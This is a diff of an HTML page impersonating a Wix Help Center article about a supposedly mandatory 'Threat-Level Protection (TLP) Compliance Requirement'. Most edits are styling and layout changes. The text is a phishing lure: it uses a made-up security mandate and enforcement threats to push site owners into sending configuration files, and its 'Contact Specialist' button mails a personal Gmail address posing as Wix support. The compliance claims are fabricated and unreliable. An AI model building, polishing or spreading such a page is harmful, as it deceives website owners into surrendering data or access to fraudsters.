@@ -2,7 +2,6 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>TLP Compliance Requirement</title>
 
@@ -23,20 +22,15 @@ body {
     display: flex;
     justify-content: space-between;
     align-items: center;
-    padding: 14px 32px;
+    padding: 14px 24px;
     background: #fff;
     border-bottom: 1px solid #e6e6e6;
+    flex-wrap: wrap;
 }
 
 .left-header {
     display: flex;
     align-items: center;
-    gap: 15px;
-}
-
-.menu {
-    font-size: 20px;
-    cursor: pointer;
 }
 
 .logo {
@@ -44,13 +38,16 @@ body {
     font-size: 18px;
 }
 
+/* RIGHT HEADER */
 .right-header {
-    font-size: 14px;
+    display: flex;
+    align-items: center;
+    gap: 15px;
 }
 
 .right-header a {
-    margin-left: 20px;
     text-decoration: none;
+    font-size: 14px;
     color: #162d3d;
 }
 
@@ -59,6 +56,12 @@ body {
     color: #fff !important;
     padding: 8px 14px;
     border-radius: 20px;
+}
+
+/* MENU ICON (RIGHT SIDE) */
+.menu {
+    font-size: 20px;
+    cursor: pointer;
 }
 
 /* WRAPPER */
@@ -72,34 +75,33 @@ body {
 /* ARTICLE */
 .article {
     background: #fff;
-    padding: 40px 50px;
+    padding: 40px;
     border-radius: 8px;
 }
 
 h1 {
-    font-size: 30px;
+    font-size: 28px;
     margin-bottom: 10px;
 }
 
 .meta {
     font-size: 13px;
     color: #6b7c93;
-    margin-bottom: 30px;
+    margin-bottom: 25px;
 }
 
 h2 {
     font-size: 18px;
-    margin-top: 30px;
+    margin-top: 25px;
     margin-bottom: 10px;
 }
 
 p {
     font-size: 15px;
-    line-height: 1.8;
+    line-height: 1.7;
     color: #2c3c4c;
 }
 
-/* BLUE HIGHLIGHT */
 .highlight {
     color: #116dff;
     font-weight: 600;
@@ -141,12 +143,13 @@ p {
     margin-top: 60px;
     background: #fff;
     border-top: 1px solid #eee;
-    padding: 40px;
+    padding: 40px 20px;
 }
 
 .footer-grid {
     display: flex;
-    gap: 40px;
+    justify-content: space-between;
+    gap: 30px;
     max-width: 1000px;
     margin: auto;
 }
@@ -171,8 +174,31 @@ p {
 
 /* MOBILE */
 @media (max-width:768px){
-    .article {padding:25px;}
-    .footer-grid {flex-direction:column;}
+
+    .header {
+        padding: 12px 16px;
+    }
+
+    .right-header a:not(.cta) {
+        display: none;
+    }
+
+    .article {
+        padding: 20px;
+    }
+
+    h1 {
+        font-size: 22px;
+    }
+
+    p {
+        font-size: 14px;
+    }
+
+    .footer-grid {
+        flex-direction: column;
+        gap: 20px;
+    }
 }
 </style>
 </head>
@@ -182,7 +208,6 @@ p {
 <!-- HEADER -->
 <div class="header">
     <div class="left-header">
-        <div class="menu">☰</div>
         <div class="logo">WIX</div>
     </div>
 
@@ -190,11 +215,12 @@ p {
         <a href="#">Help Center</a>
         <a href="#">Contact Us</a>
         <a href="#" class="cta">Create Your Site</a>
+        <div class="menu">☰</div>
     </div>
 </div>
 
+<!-- CONTENT -->
 <div class="wrapper">
-
 <div class="article">
 
 <h1>Threat-Level Protection (TLP) Compliance Requirement</h1>
@@ -207,27 +233,29 @@ As part of an ongoing, platform-wide security enhancement initiative, Wix has im
 <h2>What is Threat-Level Protection (TLP)?</h2>
 <p>
 Threat-Level Protection (TLP) constitutes a comprehensive framework of advanced security configurations and preventative controls that are intended to safeguard websites against a broad spectrum of vulnerabilities, including unauthorized system access, data interception, and malicious exploitation.
+
 </p>
 
 <p>
-When properly implemented, TLP functions as a critical defensive layer protecting sensitive user information such as form submissions, authentication credentials, and payment-related data from compromise.
+When properly implemented, TLP safeguards sensitive user data such as authentication credentials, form submissions, and payment information.
 </p>
 
 <h2>Importance of Compliance</h2>
 <p>
 Failure to maintain a properly configured TLP environment may significantly increase exposure to security breaches, leading to unauthorized access, operational disruptions, and loss of user trust.
+
 </p>
 
 <p>
-As such, adherence to TLP compliance is <span class="highlight">mandatory</span> for all websites operating within the platform.
+Compliance is <span class="highlight">mandatory</span> for all websites.
 </p>
 
-<h2>Required Actions Based on Compliance Status</h2>
+<h2>Required Actions</h2>
 
 <h2>If TLP Has Already Been Configured</h2>
 <p>
-Users must submit their configuration files for verification via 
-<span class="highlight">compliance@support.wix.com</span> to confirm compliance.
+Users must submit their configuration files for verification to confirm compliance via
+<span class="highlight">compliance@support.wix.com</span>.
 </p>
 
 <h2>If TLP Has Not Yet Been Configured</h2>
@@ -237,7 +265,7 @@ Users are required to initiate setup immediately. Failure to comply may result i
 
 <h2>Assistance and Support</h2>
 <p>
-Users requiring assistance may connect with a specialist for guided support to ensure proper implementation of all required configurations.
+Users with a flagged website and requiring assistance may connect with a specialist using the contact button for guided support to ensure proper implementation of all required configurations.
 </p>
 
 <h2>Compliance Deadline and Enforcement</h2>
@@ -255,7 +283,7 @@ This requirement applies universally and supports the platform’s commitment to
 Users are strongly advised to act promptly to verify their TLP status and complete all required actions to ensure uninterrupted service.
 </p>
 
-<a class="btn" href="mailto:thesupremedigitals@gmail.com?subject=TLP%20Assistance&body=Hello,%0D%0A%0D%0AI%20require%20assistance%20with%20my%20TLP%20configuration.%0D%0APlease%20advise.%0D%0A%0D%0AThank%20you.">
+<a class="btn" href="mailto:thesupremedigitals@gmail.com">
 Contact Specialist
 </a>
 
@@ -268,8 +296,10 @@ Was this article helpful?
 </div>
 </div>
 
+<!-- FOOTER -->
 <div class="footer">
 <div class="footer-grid">
+
 <div class="footer-col">
 <h4>Product</h4>
 <a href="#">Website Builder</a>
@@ -287,6 +317,7 @@ Was this article helpful?
 <a href="#">Help Center</a>
 <a href="#">Contact</a>
 </div>
+
 </div>
 </div>
 
